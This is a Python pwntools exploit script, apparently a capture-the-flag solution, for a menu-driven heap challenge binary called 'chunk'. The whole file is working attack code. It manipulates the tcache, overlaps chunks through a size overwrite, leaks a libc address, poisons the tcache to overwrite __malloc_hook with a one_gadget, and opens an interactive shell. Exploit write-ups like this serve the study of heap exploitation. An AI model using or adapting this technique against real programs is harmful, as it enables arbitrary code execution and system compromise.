from LibcSearcher import *
from pwn import *

r=process("./chunk")
elf=ELF("./chunk")
def add(ID,size):
	r.recvuntil(": ")
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(ID))
	r.recvuntil(": ")
	r.sendline(str(size))
def show(ID):
	r.recvuntil(": ")
	r.sendline("2")
	r.recvuntil("?")
	r.sendline(str(ID))
	r.recvuntil(": ")
def edit(ID,Content):
	r.recvuntil(": ")
	r.sendline("4")
	r.recvuntil("?")
	r.sendline(str(ID))
	r.recvuntil(": ")
	r.sendline(Content)
def delete(ID):
	r.recvuntil(": ")
	r.sendline("3")
	r.recvline()
	r.sendline(str(ID))
def deleteTcache():
	for i in range(7):
		add(i,0xf8)
def fillTcache():
	for i in range(7):
		delete(i)
deleteTcache()
add(7,0xf8)
add(8,0x28)
add(9,0xf8)
fillTcache()
delete(9)
delete(7)
deleteTcache()
add(7,0xf8)
add(9,0xf8)
edit(8,0x20*'a'+p64(0x130))
fillTcache()
delete(7)
delete(9)
add(7,0xf8)
show(7)
malloc_hook_addr=u64(r.recv(6).ljust(8,'\x00'))-0x60
print(hex(malloc_hook_addr))
libc_base=malloc_hook_addr-0x1BEB70
one_gadget_addr=libc_base+0xCBCDA
add(8,0xf0)
edit(7,'a'*0xf0+p64(0x100))
fillTcache()
delete(8)
deleteTcache()
add(7,0xf0)
add(9,0xf0)
delete(8)
edit(9,p64(malloc_hook_addr-0x10))
add(8,0xf0)
add(9,0xf0)
edit(9,p64(one_gadget_addr))
r.interactive()
